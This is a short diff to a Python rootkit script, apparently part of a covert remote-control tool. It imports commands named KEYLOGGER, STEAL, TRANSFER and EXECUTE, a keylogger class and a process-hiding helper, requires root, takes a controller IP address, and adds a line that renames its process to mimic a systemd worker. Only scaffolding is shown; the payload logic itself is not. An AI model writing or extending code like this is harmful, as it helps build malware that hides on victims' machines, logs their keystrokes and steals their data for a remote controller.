@@ -23,7 +23,7 @@ import subprocess
 from utils.encryption import StreamEncryption, BlockEncryption
 from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER, EXECUTE, STEAL
 from utils.validation import validate_ipv4_address, validate_nic_interface
-from utils.process import hide_process_name
+from utils.process import hide_process_name, set_proc_name
 from utils.keylogger import Keylogger
 
 # Third Party Libraries
@@ -37,6 +37,7 @@ if os.geteuid() != 0:
     print("ERROR: Root privileges are required to run this program!", file=sys.stderr)
     exit(1)
 
+set_proc_name("systemd-userwork-evil")
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
@@ -56,6 +57,7 @@ if not validate_ipv4_address(ARGS.controller_ip):
 if not validate_nic_interface(ARGS.interface):
     print(f"Network Interface does not exist: '{ARGS.interface}'")
     sys.exit(1)
+
 
 
 # Global Variables
